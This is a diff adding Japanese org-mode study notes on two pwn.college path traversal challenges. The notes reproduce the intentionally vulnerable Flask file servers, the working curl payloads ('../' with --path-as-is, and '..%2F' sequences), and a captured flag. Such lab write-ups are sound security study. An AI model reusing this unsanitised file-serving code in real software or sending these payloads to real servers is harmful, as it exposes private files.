@@ -1,0 +1,86 @@
+* TODO Path Traversal 1
+#+NAME: server
+#+begin_src python
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/package", methods=["GET"])
+@app.route("/package/<path:path>", methods=["GET"])
+def challenge(path="index.html"):
+    requested_path = app.root_path + "/files/" + path
+    print(f"DEBUG: {requested_path=}")
+    try:
+        return open(requested_path).read()
+    except PermissionError:
+        flask.abort(403, requested_path)
+    except FileNotFoundError:
+        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
+    except Exception as e:
+        flask.abort(500, requested_path + ":" + str(e))
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+#+end_src
+~--path-as-is~ を付加しないとフラグは得られなかった。curl のバージョンは\(8.17.0\)だった。
+
+#+begin_src shell :eval no
+curl --path-as-is http://challenge.localhost/package/../../flag
+#+end_src
+* DONE Path Traversal 2
+CLOSED: [2026-06-09 火 23:32]
+:LOGBOOK:
+- CLOSING NOTE [2026-06-09 火 23:32] \\
+  fortunes を見落していてなかなか解けなかった...
+
+  #+begin_example
+  pwn.college{kKM0dpmyBsNbIWN2_DdICoYE9yq.dJjN1YDL2AjNyMzW}
+  #+end_example
+- Note taken on [2026-06-09 火 22:18] \\
+  おしい？
+
+  #+begin_example
+  127.0.0.1 - - [09/Jun/2026 13:09:55] "GET /serve/..%2f..%2fflag HTTP/1.1" 404 -
+  #+end_example
+:END:
+#+NAME: server
+#+begin_src python
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/serve", methods=["GET"])
+@app.route("/serve/<path:path>", methods=["GET"])
+def challenge(path="index.html"):
+    requested_path = app.root_path + "/files/" + path.strip("/.")
+    print(f"DEBUG: {requested_path=}")
+    try:
+        return open(requested_path).read()
+    except PermissionError:
+        flask.abort(403, requested_path)
+    except FileNotFoundError:
+        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
+    except Exception as e:
+        flask.abort(500, requested_path + ":" + str(e))
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+#+end_src
+
+#+begin_src shell
+curl "challenge.localhost/serve/fortunes/..%2F..%2F..%2Fflag"
+#+end_src
+** 参考
+1. [[https://blog.hamayanhamayan.com/entry/2021/12/08/220449][CTFのWebセキュリティにおけるPath Traversal, LFI/RFI (File Upload, ZipSlip) - はまやんはまやんはまやん]]
